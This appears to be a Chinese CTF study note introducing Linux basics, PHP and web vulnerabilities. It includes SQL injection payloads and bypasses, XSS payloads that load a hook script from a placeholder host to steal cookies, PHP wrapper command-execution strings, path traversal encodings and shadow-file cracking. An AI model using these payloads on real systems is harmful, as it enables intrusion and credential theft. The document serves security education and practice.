[TOC]













# :warning:   从0到1学CTF

## 一.什么叫做CTF夺旗赛？

### 01. 什么叫做CTF

- CTF参赛队伍通过攻防对抗，程序分析等形式，率先从主办方给出的比赛环境中的==一串具有一定格式的字符串==或其他内容提交给主办方从而夺得分数，这样的叫做夺旗赛。

### 02. CTF比赛规则

CTF比赛可以有三种类型：

- 单兵作战：理论、杂项、web、pwn、逆向等各种题目
- 综合靶场：团队形式攻击相同环境的靶机，主要是web题型，只需攻击无需防御，一个靶机通常会有多个flag，通常放在web根目录、桌面、C盘根目录（/flag 、flag.php 、phpinfo...）
- 混战模式：参赛者既是攻击者又是防御者，通过ssh管理靶机，只有web权限，flag每隔几分钟一轮，有初始分，flag被其他队拿走会扣分，拿到其他队flag会加分，主办方会检查web服务是否正常，check不过就扣分，扣的分均分给正常的队伍。

### 03. CTF知识点

- ==Web==：sql注入、xss、文件上传、包含漏洞、xxe、ssrf、XFF、命令执行、代码审计等
- Pwn：破解题。攻击远程服务器的服务。会提供服务程序的二进制文件。分析漏洞并写出exp。栈溢出，堆溢出。绕过保护机制（ASLR，NX等）
- 逆向：逆向，破解程序的算法来得到程序的flag。对抗反调试，代码混淆等
- 移动安全：主要考察选手对安卓以及ios系统的理解
- 杂项（Misc），取证，编解码，加解密，隐写，图片处理PS使用方法，压缩包，编程编写攻击脚本

## 二.Web狗出题套路：

- 爆破，包括包括==md5==、爆破随机数、验证码识别等
- 绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截
- 花式玩弄几个PHP特性，包括==弱类型==，strpos和===，反序列化+destruct、\0截断、iconv截断、
- 密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小
- 各种找源码技巧，包括git、svn、xxx.php.swp、*www*.(zip|tar.gz|rar|7z)、xxx.php.bak、
- 文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测<?php <? <% <script language=php>、花式解析漏洞、
- Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换
- open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法
- 条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱
- 社工，包括花式查社工库、微博、QQ签名、whois
- windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断
- SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等
- XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过
- XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）
- 协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包

## 三.Web基础知识：

### 01.Linux常用知识

```shell
netstat -pan 
//查看当前开放的端口

lsof -i
//显示进程和端口对应关系

ps -aux
查看进程

chkconfig --list
//查看服务启动信息

vi /etc/profile
添加umask 027
即创建文件主有读写执行权限，同组读和执行权限，其他用户无权限。
添加TMOUT=180 即无操作时间超过3分钟即登录超时。

锁定不必要的账号，可以使用passwd -l <用户名> 来进行禁用


配置文件：来防止口令暴力破解，降低风险
cat /etc/pam.d/system-auth 查看配置文件
设置连续输错10次密码，账号锁定5分钟
vim /etc/pam.d/system-auth 添加
auth required pan_tally.so onerr=fail deny=10 unlock_time=300

空口令账号：
awk -F:'($2=="")' /etc/shadow   查看空口令账号
awk -F:'($3==0)' /etc/passwd    查看UID为零的账号

passwd <用户名> 为空口令账号设定密码
UID为零的账号应该只有root 设置UID方法：usermod -u UID <用户名>


chage -m 0 -M 30 -E 2020-10-29 -W 7 <用户名>
//将此用户的密码最长使用天数设为30天，最短使用天数为0天，账号于2020年10月29日过期，过期前7天警告用户。

限制root远程登录，
cat /etc/sercuretty | grep CONSOLE 查看是否禁止root远程登录
vim /etc/securetty         设置 CONSOLE=/dev/tty01

禁止用户使用su


网络配置安全
sysctl -a 查看当前网络参数
vim /etc/sysctl.conf 修改配置
sysctl -p 重新生效


ps 查看系统当前运行的进程
locate/find 查找指定名称文件
netstat 列出所有监听端口
strings 协助分析二进制文件的安全性
strace判断程序运行的行为

弱口令审计

后门程序检测
chkrootkit
http://www.chkrootkit.org/
./chkrootkit -q -r/


Rootkit Hunter
http://rkhunter.sourceforge.net/
rkhunter -check

netdiscover -r ip/24
嗅探网络，查询存活主机
nmap 扫一下端口
nikto -host ip
探测敏感信息
dirb http://ip:port
探测网络

查看当前网络连接数
netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'     防止攻击者远程木马连接

显示每个ip并统计连接数
netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n

破解shadow密码（/etc/shadow）：
./john /etc/shadow

查看用户登录历史：
/var/log/wtmp   保存了登陆成功的历史信息；
/var/log/btmp   保存了登陆失败的历史信息。
必须使用 last  或者   lastb 查看，因为这两个文件不是ASCII文件。

统计80端口连接
netstat -nat|grep -i "80"      |wc -l

查看当前连接到flag机切处于established状态的ip：（写一个自动化脚本，实时监控和关闭危险的ip连接！！！）
netstat -atnp|grep "ESTA"
netstat -atnp

sed 's/ /\n/g '
空格转变为回车

linux备份：
dump -0f /backup/www.dmp /var/www    对/var/wwww进行完全备份，备份名为www.dmp
restore -r -f /backup/www.dmp        恢复备份


sudo passwd root
更改root账户密码

awk -F "" '{print $2}'
以" "为分隔符，打印第二列

sort 
-n 从小到大
-r 逆序
-k 按照第几列进行排序

head -10
取前10个

uniq -c
统计重复的行数

tr -d '"'
去掉所有引号

sed -z 's/\n\b/,\g'
用,号拼接字符串
```

#### 1.ss

Linux上的ss命令可以用于替换netstat，ss直接读取解析/proc/net下的统计信息，相比netstat遍历/proc下的每个PID目录，速度快很多。

常见示例：

- ss -t -a 显示所有的TCP Sockets
- ss -u -a 显示所有的UDP Sockets
- ss -x src /tmp/a.sock 显示连接到/tmp/a.sock的进程
- ss -o state [state TCP-STATE] 如ss -o state established显示所有建立的连接

#### 2.nc

nc可以在Linux上开启TCP Server、TCP Client、UDP Server、UDP Client。

如在端口号12345上开启TCP Server和Client模拟TCP通信：

```
Server:  nc -l 127.0.0.1 12345
Client:  nc 127.0.0.1 12345 
```

在端口号12345上开启UDP Server和Client模拟TCP通信：

```
Server:  nc -ul 127.0.0.1 12345
Client:  nc -u 127.0.0.1 12345
```

### 02.PHP:

原始定义：Personal Home Page Tools

当前定义：Hypertext Preprocessor超文本预处理器

PHP：服务器端脚本、命令行脚本

以<?php开头，以?>结尾

单引号作为字符串输出

双引号作为命令输出

路由异或注入

```txt
1000的二进制是1111101000，只要找两个数异或一下就行了，比如1111100000（992）和1000（8）
```

**md5**值碰撞

```sql
QNKCDZO

240610708

s878926199a

s155964671a

s214587387a

s214587387a

数组绕过！！
```





```
基本常识： 
$GLOBALS
当前脚本的全局变量
$_SERVER
变量由web服务器设定
$_GET
网页提交GET变量
$_POST
网页提交POST变量
$_COOKIE
网页cookie变量
$_FILES
上传文件的变量
$_ENV
执行环境提交至脚本的变量
$_$_$_
```

选择一个主攻方向加以研究，选择合适的技能树：

### 03.网络知识



```shell
netstat -tuln
//取得当前主机启动的服务
常见端口服务：
21：ftp
22：ssh
80：www
25：mail
111：RPC（远程过程调用）
631：CUPS（打印服务功能）

```

```shell
sh启动时
-n，不执行脚本，仅查询语法问题
-v，执行前打印全内容
-x：将使用到的脚本内容打印出来

```

#### 常用端口举例：

```shell
5 远程作业登录
11 在线用户
13 时间
18 消息发送协议
20 FTP传输
21 FTP控制
22 ssh远程登录
23 telnet终端仿真协议，木马Tiny Telnet Server开放
24 预留个人用邮件系统
25 SMTP服务器开放端口，发邮件
31 MSG验证
53 dns域名服务器
63 whois++
80 http服务
107 远程Tenlent服务
109 POP2接收邮件
110 POP3接收邮件
113 鉴别TCP连接的用户
118 SQL服务

```

curl 直接访问可以得到响应报文以及响应主体！

```bash
curl -i http://xxxx.xxx.com
```





以==web==为例：

- 计算机基础（操作系统、网络技术、编程）

- web应用（Http协议、web开发框架）

  1XX，信息型状态码，接收的请求正在处理

  2XX，成功状态码，请求正常处理完毕（200）

  3XX，重定向状态码，需要进行附加操作以完成操作（301）（302）（304）

  4XX，客户端错误状态码，服务器无法处理请求（404）（403）（400）（401）

  5XX，服务器错误状态码，服务器处理请求出错（500）（503）

  ------

  200，正常处理

  301，永久性重定向，请求资源已被分配新的URI，以后应使用资源现在所指的URI

  302，临时性重定向，表示本次使用资源现在所指的URI

  304，客户端发送附带条件的请求时，服务器允许请求，但条件不符合。如登录系统

  400，请求报文中出现语法错误，需修改内容再次发送

  401，该状态码表示发送的请求要通过HTTP认证的认证信息，若之前进行过一次请求，则表示用户认证失败

  403，表明对请求资源的访问被服务器拒绝了

  404，表明服务器上无法找到请求的资源

  500，表明服务器在执行请求时发生了错误，也有可能是web应用存在的bug或某些临时的故障

  503，表示服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。

- 数据库

  - MySQL数据库

- 刷题

  1. 掌握适当的刷题技巧，熟能生巧！
  2. 上靶场刷题，刷越多越好！！！！、



### 04.Python-Hacker用处

#### 1.正则表达式

re模块进行匹配

```python
import re
pattern=re.compile('hello')
match=pattern.match('hello world!')
print(match.group())
```

或者

```python
import re
word=re.findall('hello', 'hello world!')
print(word)
```

...杂，上网搜

#### 2.Web编程

#### 3.多线程编程

#### 4.网络编程

```bash
python3 -m http.server 8000
```

快速开端口！

#### 5.数据库编程



## 四.漏洞简介：

### 01.**SQL 注入**

通过在用户可控参数中注入 SQL 语法，破坏原有 SQL 结构，达到编写程序时意料之外结果的攻击行为。其成因可以归结为以下两个原因叠加造成的：

1. 程序编写者在处理应用程序和数据库交互时，使用==字符串拼接==的方式构造 SQL 语句
2. 未对用户可控参数进行足够的==过滤==便将参数内容==拼接==进入到 SQL 语句中

#### 1.注入类型

##### 1.基于从服务器接受到的响应

###### 1.基于错误的SQL注入

###### 2.联合查询的类型

###### 3.堆查询注射

###### 4.SQL盲注

- 基于布尔的SQL盲注

- 基于时间的SQL盲注

- 基于报错的SQL盲注

#### 2.基于如何处理输入的SQL查询（数据类型）

###### 1.基于字符串

###### 2.数字或整数为基础的

##### 3.基于程度和顺序的注入

###### 1.一阶注射

###### 2.二阶注射

###### 3.通过用户输入的表单域的注射

###### 4.通过cookie注射

###### 5.通过服务器变量注射（基于头部信息得到注射）

#### 1.MySQL

##### ① 常见函数：

- `user()`：当前数据库用户
- `database()`：当前数据库名
- `version()`：当前使用的数据库版本
- `@@datadir`：数据库存储数据路径
- `@@version_compile_os`：操作系统版本
- `concat()`：联合数据，用于联合两条数据结果。如 `concat(username,0x3a,password)`
- `group_concat()`：和 `concat()` 类似，如 `group_concat(DISTINCT+user,0x3a,password)`，用于把多条数据一次注入出来
- `concat_ws()`：含有分隔符地连接字符串
- `hex()` 和 `unhex()`：用于 hex 编码解码
- `load_file()`：以文本方式读取文件，在 Windows 中，路径设置为 `\\`
- `select xxoo into outfile '路径'`：权限较高时可直接写文件

##### ② 万能密码：

- `admin' --`
- `admin' #`
- `admin'/*`
- `' or 1=1--`
- `' or 1=1#`
- `' or 1=1/*`
- `') or '1'='1--`
- `') or ('1'='1--`
- 以不同的用户登陆 `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`

--+ 可以用# %23替换

##### ③ False注入

构造false注入点：

- 算术运算

  ```mysql
  加：
  '+', 拼接的语句：where username=''+''
  减：
  '-' 拼接的语句：where username=''-''
  乘：
  '*' 拼接的语句：where username=''*''
  除：
  '/6# 拼接的语句：where username=''/6#
  取余：
  '%1# 拼接的语句：where username=''%1#
  ```

- 位操作运算

  当字符串和数字运算的时候类型转换的问题进行注入

  ```mysql
  和运算：&
  '&0# 拼接的语句：where username=''&0#'
  或运算：|
  '|0# 拼接的语句：where username=''|0#'
  异或运算：^
  '^0# 拼接的语句：where username=''^0#'
  移位操作：
  '<<0# '>>0#
  位非运算：
  在表达式之前进行
  ```

- 比较运算

  ```mysql
  安全等于：<=>
  '=0<=>1# 拼接的语句：where username=''=0<=>1#'
  
  不等于<>(!=)
   '=0<>0# 拼接的语句：where username=''=0<>0#'
   
  大小于>或<
   '>-1# 拼接的语句：where username=''>-1#
  ```

- 其他

  ```mysql
  '+1 is not null#  'in(-1,1)#  'not in(1,0)#  'like 1#  'REGEXP 1#  'BETWEEN 1 AND 1#  'div 1#  'xor 1#  '=round(0,1)='1  '<>ifnull(1,2)='1
  ```

##### ④ 注入技巧：

- **常量：**true， false， null， N, current_timestamp变量：@myvar:=1

- **系统变量：**@@version, @@datadir….

- **常用函数：**version(), pi(), pow(), char(), substring()

- **字符串生成：**hex(), conv()
- true=1,floor(pi())=3,ceil(pi())=4,floor(version())=5,ceil(version())=6

**过滤的绕过**：

```mysql
空格：%20, %09, %0a, %0b, %0c, %0d, %a0，还有一些可以利用括号或者注释  and，or：||，&&  union select：  利用括号，'and(true)like(false)union(select(pass)from(users))，  方括号union [all|distinct] select pass from users#，  union%a0select pass from users，  或者内联注释union/*&sort=*/select pass from users#  union：子查询进行盲注and length((select pass from users having substr(pass,1,1)='a'))  having：and(select substr(group_concat(pass),1,1)from users)='a  select ... from(过滤代码如/SELECTs+[A-Za-z.]+s+FROM/i/i)：  select [all|distinct] pass from users  select`table_name`from`information_schema` . `tables`  select pass as alias from users  select pass aliasalias from users  select pass`alias alias`from users  select+pass%a0from(users)  select,and,&：  这里就是可以利用上文中提到的false注入的方式进行绕过，具体见上文
```

不适用括号：

'and substr(data from 1 for 1) = 'a'#

常用语句：

```sql
' and 0 union select 1,2,3 #

' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS # 得到表名，很明显我们需要得到 secret_table

' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'# 得到 secret_table

' and 0 union select 1,2,fl4g from secret_table #
```

先检查是否存在注入点，最简单的就是对比1和1'的区别

order by 根据字段进行排序，当超过字段长度时，就会报错！

1. 带出库名，order by 进行字段爆破，然后构造union

   ```
   ?id=1' union select database(),1,1 --+
   //--+把后面的给注释掉
   //在PHP中+等同于空格
   ```
   
   数据库爆破：
   
   ```sql
   select group_concat(table_name) from information_schema.
   ```
   
   ```sql
   -1%20/**/union%20/**/select%201,group_concat(schema_name),3,4%20from%20information_schema.schemata
   ```
   
   爆破构造：
   
2. 然后找到表名，看列名：

   ```sql
   select group_concat(table_name) from information_schema.TABLES where table_schema='爆破出的表名'
   
   
   SELECT
   	group_concat( table_name ) 
   FROM
   	information_schema.TABLES 
   WHERE
   	table_schema = 'mysql'
   ```

   ```sql
   -1%20/**/union%20/**/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema="fakebook"
   ```

   爆破列名：

3. 然后直接攻击字段名字

   ```sql
   SELECT
   	group_concat( COLUMN_name ) 
   FROM
   	information_schema.COLUMNS 
   WHERE
   	table_name = 'xiangmuid' 
   	AND table_schema = 'mysql'
   
   ```
      爆破字段值：

   ```sql
   -1%20/**/union%20/**/select%201,group_concat(column_name),3,4%20from%20information_schema.columns%20where%20table_schema="fakebook"
   ```

4. 从字段处取值

   ```sql
   SELECT
   	concat( userpwd,'--', username,'--', user_uid ),
   	1,
   	1 
   FROM
   	`xiangmuid`
   //取值！！1
   ```

###### 数据表关注：

查看系统数据库information_schema

```sql
select schema_name from information_schema.schemata
```

然后猜库表

```sql
select table_name from information_schema.tables where table_schema=’xxxxx’
```

然后猜列

```sql
Select column_name from information_schema.columns where table_name=’xxxxx’
```

然后获取某列的内容

```sql
Select *** from ****
```

数据库查文件

```sql
-1%20/**/union%20/**/select%201,2,3,%27O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}%27
```




##### ⑤注入绕过

###### 1.二次编码

###### 2.宽字节注入



##### ⑥SQLmap的使用

###### 1.检查注入点：

```bash
sqlmap -u url?id=1
```

###### 2.爆所有数据库信息：

```bash
sqlmap -u url?id=1 --dbs
```

###### 3.爆当前数据库信息：

```bash
sqlmap -u url?id=1 --current-db
```

###### 4.指定库名列出所有表

```bash
sqlmap -u url?id=1 -D xxxx --tables
```

xxxx 为指定数据库名称

###### 5.指定库名表名列出所有字段

```bash
sqlmap -u url?id=1 -D xxxx -T yyyy --columns
```

 yyyy 为指定表名称

###### 6.指定库名表名字段dump出指定字段

```bash
sqlmap -u url?id=1 -D xxxx -T yyyy -C ac，id，password --dump
```


 'ac,id,password' 为指定字段名称

值得注意的是：

```bash
--delay 10
#每个10s请求一次

--safe-url
#每隔一段时间去访问一个正常的页面

#使用脚本进行进一步渗透，在sqlmap/tamper里面
apostrophemask.py              用UTF-8全角字符替换单引号字符
apostrophenullencode.py        用非法双字节unicode字符替换单引号字符
appendnullbyte.py              在payload末尾添加空字符编码
base64encode.py                对给定的payload全部字符使用Base64编码
between.py                     分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”
bluecoat.py                    在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
chardoubleencode.py            对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
charencode.py                  对给定的payload全部字符使用URL编码（不处理已经编码的字符）
charunicodeencode.py           对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
concat2concatws.py            用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例
equaltolike.py                用“LIKE”运算符替换全部等于号“=”
greatest.py                   用“GREATEST”函数替换大于号“>”
halfversionedmorekeywords.py  在每个关键字之前添加MySQL注释
ifnull2ifisnull.py            用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例
lowercase.py                  用小写值替换每个关键字字符
modsecurityversioned.py       用注释包围完整的查询
modsecurityzeroversioned.py   用当中带有数字零的注释包围完整的查询
multiplespaces.py             在SQL关键字周围添加多个空格
nonrecursivereplacement.py    用representations替换预定义SQL关键字，适用于过滤器
overlongutf8.py               转换给定的payload当中的所有字符
percentage.py                 在每个字符之前添加一个百分号
randomcase.py                 随机转换每个关键字字符的大小写
randomcomments.py             向SQL关键字中插入随机注释
securesphere.py               添加经过特殊构造的字符串
sp_password.py                向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs
space2comment.py              用“/**/”替换空格符
space2dash.py                 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符
space2hash.py                 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2morehash.py             用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2mssqlblank.py           用一组有效的备选字符集当中的随机空白符替换空格符
space2mssqlhash.py            用磅注释符“#”其次是一个换行符替换空格符
space2mysqlblank.py           用一组有效的备选字符集当中的随机空白符替换空格符
space2mysqldash.py            用破折号注释符“--”其次是一个换行符替换空格符
space2plus.py                 用加号“+”替换空格符
space2randomblank.py          用一组有效的备选字符集当中的随机空白符替换空格符
unionalltounion.py            用“UNION SELECT”替换“UNION ALL SELECT”
unmagicquotes.py              用一个多字节组合%bf%27和末尾通用注释一起替换空格符 宽字节注入
varnish.py                    添加一个HTTP头“X-originating-IP”来绕过WAF
versionedkeywords.py          用MySQL注释包围每个非函数关键字
versionedmorekeywords.py      用MySQL注释包围每个关键字
xforwardedfor.py              添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF
```

##### ⑦mysql使用

###### 1.安装MySQL

以管理员身份运行,直接输入以下命令。

```bash
sudo apt update
sudo apt install mysql-server
```

安装完成后，MySQL自启。

```bash
mysql -uroot -p
```

默认是没有密码的！！

设置密码

```sql
-- 以root身份进入
set password=password('root');
```

服务启动之类的命令：

```shell
#启动
sudo service mysql start

#停止
sudo service mysql stop

#当前服务状态
sudo service mysql status
```

查看当前安装的软件包

```shell
dpkg -l | grep mysql | grep ii
```

然后可以卸载一些软件包

```shell
sudo apt-get remove <<package-name>>
```



版本5.0以上的版本中：

默认定义了information_schema数据库，用来存储数据库元信息

其中具有表schemata（数据库名）、tables（表名）、columns（列名或字段名）

```sql
select 列名称 from 表名称 where 字段1='条件' and 字段2='条件2'

insert into table name （列1，列2...）values(值1，值2...)

update 表名称 set 列名称 =新值 where 列名称=某值

delete from 表名称 where 列名称 =值
```







###### 2.命令使用

```sql
show database;

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.01 sec)

use mysql

mysql> use mysql
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

-- 查看当前使用的数据库
select database();

-- 显示当前库中的数据表：
show tables;

-- 显示数据表的结构；
describe 表名;
desc 表名;

-- 创建数据库
create database 数据库名 charset=uft8;
utf8一定要写，不然输入不了中文

-- 删除数据库
drop database 数据库名;

-- 创建以及删除数据表都是和数据库一样的操作流程；


-- 查询所有记录
select * from 数据表名;


-- 
```

退出数据库

```sql
quit
exit
ctrl+d
```



### 02.**XSS 跨站脚本攻击** 

跨站脚本攻击（Cross Site Scripting），为不和层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，故将跨站脚本攻击缩写为 XSS。恶意攻击者往 WEB 页面里插入恶意 HTML 代码，当用户浏览该页之时，嵌入其中 Web 里面的 HTML 代码会被执行，从而达到恶意攻击用户的特殊目的。

#### 1.原理：

函数类，漏洞操作对应层，浏览器内核版本，有内容提交的地方可能会有xss攻击

#### 2.分类：

- 反射型，直接攻击，攻击并不存储在数据库中，x.php-->回包

  发包x

- 存储型，持续攻击，x.php-->数据库-->x.php-->回显，后端代码

- DOM型，静态前端代码-->x.php，前端代码

#### 3.危害：

- 盗取各类用户账号，如机器登录账号、用户网银账号、各类管理员账号
- 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
- 盗窃企业重要的具有商业价值的资料
- 非法转账
- 强制发送电子邮件
- 网站挂马
- 控制受害者机器向其他网站发起攻击

#### 4.特征：

- 搜索框：反射型，主要链接式攻击
- 留言板：存储型，主要拿取别人cookie，
- DOM型：

#### 5.构建XSS脚本：

``` txt
<iframe>     <iframe>元素会创建包含另外一个文档的内敛框架（即行内框架）
<textarea>   <textarea>标签定义多行的文本输入控件
<img>        <img> 元素向元素嵌入一幅图像
<script>     <script>标签用于定义客户端，比如JavaScript。script元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件。必需的type属性规定脚本的MIME类型，JavaScript的常见应用是图像操作、表单验证以及动态内容更新。
```

##### ① 常用的JavaScript方法：

```txt
alert    alert()方法用于显示带有一条指定信息和一个确认按钮的警告框
window.location  window.location对象用于获得当前页面的地址(URL)，并把浏览器重定向到新的页面
location.href   返回当前显示得到文档的完整的URL
onload    一张页面或者一张图像完成加载
onsubmit   确认按钮被点击
onerror   在加载文档或者图像时发生错误
```

##### ② XSS脚本常用方法

```javascript
//弹框警告
//遇到一个服务器，初步检测是否有XSS漏洞或者作为演示使用，类似于SQL注入漏洞测试中的单引号，一旦这个测试成功，说明后端服务器没有对特殊字符做过滤。这样就可以证明，这个页面位置存在了XSS漏洞
<script>alert('这个绝对有漏洞')</script>
<script>alert(document.cookie)</script>

//页面嵌套
<iframe src=http://www.baidu,com></iframe>

//页面重定向
<script>window.location="http://www.baidu.com"</script>
<script>location.href="http://www.baidu.com"</script>

//弹框警告加上重定向
<script>alert("你这个稳被黑了");location.href="http://www.baidu.com"</script>
//结合一点社工的思路，例如通过网站内部私信的方式将其发给其他用户，如果其他用户点击并且相信了这个信息，则可能在另外的站点冲洗你登陆账户（克隆网站收集账户）

//访问恶意代码
<script src="http://xxxx:3000/hook.js"></script>
#结合BeEF收集用户的cookie


//巧用图片标签
<img src="#" onerror=alert('XSS')>
<img src="javascript:alert('XSS');">
<img src="http://XXXXX:3000/hook.js">
  #  
//绕开过滤的脚本
大小写<ScrIpt>alert('XSS')</SCRipt>
字符编码 采用URL、Base64等编码

    
```

##### ③ 使用BeEF

启动kali攻击机上的Apache

```shell
service apache2 start
```

启动BeEF

直接打开，beef然后填写密码

- 绿色：对目标主机生效并且不可见
- 橙色：对目标主机生效但是可能可见
- 灰色：对目标主机未必生效
- 红色：对目标主机不生效



### 03.**命令执行**

当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如 PHP 中的 ==system==、`exec`、`shell_exec` 等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，造成命令执行攻击。这里还是主要以 PHP 为主介绍命令执行漏洞，Java 等应用的细节待补充。

#### **服务器防御措施**：

1. 升级到PHP 7.1，该版本对大部分常见的执行动态代码的方法进行了封堵。
2. php.ini中，关闭“`allow_url_fopen`”。在打开它的情况下，可以通过 `phar://` 等协议丢给`include`，让其执行动态代码。
3. php.ini中，通过`disable_functions`关闭 `exec,passthru,shell_exec,system` 等函数，禁止PHP调用外部程序。
4. 永远不要在代码中使用eval。
5. 设置好上传文件夹的权限，禁止从该文件夹执行代码。
6. include 文件的时候，注意文件的来源；需要动态include时做好参数过滤。

传说中的一句话木马：

```php
<? php eval('1');
```



```
?url=touch nerisa
?url=l\s / | tee nerisa
?url=nl /fllll?aaaaaaggggggg | tee nerisa
访问/nerisa得到flag
```

```php
<?php
$a='system'; 
$ua=urlencode(~$a); 
$b="cat /flllllaaaaaaggggggg"; 
$ub=urlencode (~$b); 
$c="(~'".$ua."')"; 
$d="(~'".$ub."')"; 
echo $c.'('.$d.');'; 
?>
```



### 04. **文件包含**

如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括==本地文件包含==和远程文件包含两种形式。

引发文件包含漏洞的四个函数：

```php
include()
#包含出错，提出警告，但继续执行后续语句
include_once()
#包含过便不再包含
require()
#包含出错，直接退出，不执行后续语句
require_once()
#包含过便不再包含，避免函数重定义以及变量重赋值
```

以上四种函数包含，文件直接作为php文件进行解析：

常见如下：

```php
<?php
	$file = $_GET['file'];
	include $file;
?>
```

如果同目录下有一个phpinfo.txt,其内容为<? phpinfo();?>,则直接构造：

```php
index.php?file=phpinfo.txt
```

文件包含需要符合一下三个场景：

- 具有相关的文件包含函数。
- 文件包含函数中存在动态变量，比如 `include $file;`。
- 攻击者能够控制该变量，比如`$file = $_GET['file'];`。

#### 1.文件包含分类：

- **LFI**（Local File Inclusion）本地文件包含，一般遇到的都是本地文件包含
- **RFI**（Remote File Inclusion）远程文件包含，包含远程服务器上的文件并执行，漏洞存在危害极大，但一般不常见。需要再php.ini里面设置：
  1. allow_url_fopen = On
  2. allow_url_include = On（从php5.2之后默认为off）

#### 2.php伪协议读取：

- php://input

  ```php
  index.php
  ?file=php://input
  POST:
  <?php phpinfo();?>
  ```

  新建文件来读取info。

  ```php
  <?php fputs(fopen("oneword.php","w"),"<?php phpinfo();?>") ?>
  ```

  新建一个文件，fopen参数为w

  执行系统命令：

  ```php
  POST：
  <?php system('ipconfig');?>
  ```

- php://filter

  ```php
  index.php?file=php://filter/read=convert.base64-encode/resource=index.php
  ```

  或者：

  ```php
  index.php?file=php://filter/convert.base64-encode/resource=index.php
  ```

  要是读取到了文件，需要通过base64解码，可以使用python3-base64来进行解码：

  ```python
  >>> import base64
  >>> base64.b64decode("密文")
  b"<?php \r\n\t$file = $_GET['file'];\r\n\tinclude $file;\r\n?>"
  ```

- phar://

  假设有一个文件phpinfo.txt,内容为<?php phpinfo();?\>,并且打包成zip压缩包。

  php版本大于等于5.3.0

  绝对路径：

  ```php
  index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt
  ```

  相对路径：

  ```PHP
  index.php?file=phar://test.zip/phpinfo.txt
  ```

- zip://

  php版本大于等于5.3.0

  同时将#编码为%23

  只能指定绝对路径，使用相对路径会包含失败。

  ```php
  index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23phpinfo.txt
  ```

- data:URI schema

  php版本大于等于5.2

  allow_url_fopen = On

  allow_url_include = On

  姿势一：

  ```php
  index.php?file=data:text/plain,<?php phpinfo();?>
  ```

  执行命令：

  ```php
  index.php?file=data:text/plain,<?php system('whoami');?>
      ?page=data://text/plain,<?php system('ls');?>
  ```

  姿势二：

  ```php
  index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
  ```

  加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：<?php phpinfo();?\>

  执行命令：

  ```php
  index.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
  ```

  其中PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==的base64解码为：<?php system('whoami');?\>

- 包含session：

  session路径已知：

  1. /var/lib/php/sess_PHPSESSID
  2. /var/lib/php/sess_PHPSESSID
  3. /tmp/sess_PHPSESSID
  4. /tmp/sessions/sess_PHPSESSID
  5. php的session文件的保存路径可以在phpinfo的session.save_path看到。

  ==功能后续挖掘！==

- 包含日志：（==后面熟悉了再来了解深入==）

  1. 访问日志

  2. SSH log

     /var/log/auth.log

     ```shell
     ubuntu@VM-207-93-ubuntu:~$ ssh '<?php phpinfo(); ?>'@remotehost
     ```

  3. 包含environ

  4. 包含fd

  5. 包含临时文件

  6. 包含上传文件

#### 3.绕过姿势：

1. 指定前缀

   例如：

   ```php
   <?php
   	$file = $_GET['file'];
   	include '/var/www/html/'.$file;
   ?>
   ```

   可以使用 ../../../../来进行目录的遍历

   ```php
   include.php?file=../../log/test.txt
   ```

   最简单也是最常用的！！

2. 编码过滤

   - 利用url编码
     - ../
       - %2e%2e%2f
       - ..%2f
       - %2e%2e/
     - ..\
       - %2e%2e%5c
       - ..%5c
       - %2e%2e\
   - 二次编码
     - ../
       - %252e%252e%252f
     - ..\
       - %252e%252e%255c
   - 容器/服务器的编码方式
     - ../
